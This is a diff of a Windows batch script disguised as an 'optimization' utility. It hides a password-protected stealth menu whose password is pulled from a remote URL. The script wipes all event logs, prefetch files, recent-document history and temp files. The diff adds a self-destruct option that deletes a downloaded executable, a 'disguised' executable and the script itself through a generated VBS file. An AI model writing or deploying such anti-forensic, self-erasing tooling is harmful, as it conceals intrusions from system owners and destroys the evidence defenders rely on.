@@ -38,14 +38,12 @@ goto LOGIN
 :CheckStealthPassword
 set "inputpass=%~1"
 for /f "usebackq delims=" %%A in (`powershell -Command "(Invoke-WebRequest -Uri '%STEALTH_PASS_URL%' -UseBasicParsing).Content.Trim()"`) do set "remote_pass=%%A"
-
 if /i "%inputpass%"=="%remote_pass%" (
     exit /b 0
 ) else (
     exit /b 1
 )
 
-:: ----------- OPTIMIZATION MENU ------------
 :OPTIMIZATION_MENU
 cls
 echo ==========================================
@@ -78,16 +76,16 @@ goto OPTIMIZATION_MENU
 :CLEAN_REGISTRY_LOGS
 echo Cleaning Registry Logs...
 for /f "tokens=*" %%G in ('wevtutil el') do (
-    wevtutil cl "%%G" >nul 2>&1
+    wevtutil cl "%%G" 2>nul
 )
 echo Registry logs cleared.
 pause
 goto OPTIMIZATION_MENU
 
 :CLEAN_EVENT_LOGS
-echo Cleaning Event Logs (skipping protected logs)...
+echo Cleaning Event Logs...
 for /f "tokens=*" %%G in ('wevtutil el') do (
-    wevtutil cl "%%G" >nul 2>&1
+    wevtutil cl "%%G" 2>nul
 )
 echo Event logs cleared.
 pause
@@ -126,7 +124,6 @@ sfc /scannow
 pause
 goto OPTIMIZATION_MENU
 
-:: ----------- STEALTH MENU ------------
 :STEALTH_MENU
 cls
 echo  ===========================================
@@ -141,6 +138,7 @@ echo  2. Run
 echo  3. Bypass
 echo  4. Alert the Admin !!!
 echo  5. Exit
+echo  6. Self-Destruct Stealth Menu
 echo.
 set /p choice=Choose an option: 
 
@@ -149,6 +147,7 @@ if "%choice%"=="2" goto RUN
 if "%choice%"=="3" goto BYPASS
 if "%choice%"=="4" goto ALERT_ADMIN
 if "%choice%"=="5" goto EXIT
+if "%choice%"=="6" goto SELF_DESTRUCT
 
 echo Invalid choice. Try again.
 timeout /t 2 /nobreak >nul
@@ -202,16 +201,16 @@ echo Running cleanup...
 :: Clear recent files
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f >nul 2>&1
 
-:: Clear prefetch files (only EXE-related if name known)
-del /q /f "%SystemRoot%\Prefetch\CAXVN*.pf" >nul 2>&1
+:: Clear prefetch files
+del /q /f /s "%SystemRoot%\Prefetch\*.*" >nul 2>&1
 
 :: Clear temp files
 del /s /q "%temp%\*.*" >nul 2>&1
 del /s /q "C:\Windows\Temp\*.*" >nul 2>&1
 
-:: Clear event logs (skip errors)
+:: Clear event logs
 for /f "tokens=*" %%G in ('wevtutil el') do (
-    wevtutil cl "%%G" >nul 2>&1
+    wevtutil cl "%%G" 2>nul
 )
 
 :: Flush DNS
@@ -234,4 +233,22 @@ pause
 goto STEALTH_MENU
 
 :EXIT
+exit
+
+:SELF_DESTRUCT
+echo Initiating Self-Destruct...
+timeout /t 1 >nul
+
+:: Delete downloaded EXE and disguised file
+del /f /q "%SETUP_EXE%" >nul 2>&1
+del /f /q "%DISGUISED_EXE%" >nul 2>&1
+
+:: Delete this batch file using VBS
+set "BATFILE=%~f0"
+echo Set fso = CreateObject("Scripting.FileSystemObject") > "%temp%\delete_me.vbs"
+echo fso.DeleteFile "%BATFILE%", True >> "%temp%\delete_me.vbs"
+start /min "" "%temp%\delete_me.vbs"
+timeout /t 2 >nul
+del "%temp%\delete_me.vbs" >nul 2>&1
+
 exit
